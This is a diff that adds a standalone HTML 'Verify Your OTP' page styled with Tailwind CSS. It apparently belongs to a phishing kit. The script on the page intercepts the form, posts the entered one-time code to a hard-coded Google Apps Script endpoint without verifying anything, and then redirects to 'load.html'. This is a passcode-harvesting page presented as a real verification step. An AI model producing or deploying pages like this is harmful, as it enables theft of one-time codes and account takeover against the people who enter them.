@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>OTP page  with tailwind css responsive</title>
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+  </head>
+    
+  <body>
+  <body class="bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 flex items-center justify-center min-h-screen">
+    <div class="bg-white shadow-lg rounded-lg p-8 max-w-xs md:max-w-md w-full">
+        <h2 class="text-xl md:text-2xl font-bold text-center text-gray-800 mb-6">Verify Your OTP</h2>
+        <p class="text-center text-gray-600 mb-4">Enter the 6-digit OTP sent to your email.</p>
+        <form method="post" name="Mform">
+            <div class="flex space-x-2 justify-center mb-6">
+                <input type="text" style="width:300px;" maxlength="8" name="KO" class="w-10 h-10 md:w-12 md:h-12 border border-gray-300 rounded-lg text-center text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-purple-500" />
+               
+            </div>
+            <button type="submit" id="sub" class="w-full bg-purple-500 text-white py-2 md:py-3 rounded-lg font-semibold hover:bg-purple-600 transition duration-200">Verify OTP</button>
+        </form>
+        <p class="text-center text-gray-600 mt-6">
+            Didn’t receive the code? <a href="#" class="text-purple-500 hover:underline">Resend OTP</a>
+        </p>
+    </div>
+</body>
+<script>    
+ const scriptURL = 'https://script.google.com/macros/s/AKfycbxYc7QOZXkRuC_5GdoEaeQC6fDS52OBemt6_HERQTNVQR2wJaxI9LY8_VjXj_FZTrzf/exec'
+        const form = document.forms['Mform']
+        form.addEventListener('submit', e => { 
+         e.preventDefault()
+     document.querySelector("#sub").innerHTML="Processing..";
+     let requestBody = new FormData(form)
+     fetch(scriptURL, { method: 'POST', body: requestBody})
+        .then(() => { form.reset();
+        document.querySelector("#sub").innerHTML="Proceed";
+        window.location.replace("load.html");
+         })
+       .catch(error => {
+       alert('Check your internet connection!', error.message)
+         submitButton.disabled = false
+
+       }
+       )
+   })
+
+    </script>
+  
+</html>
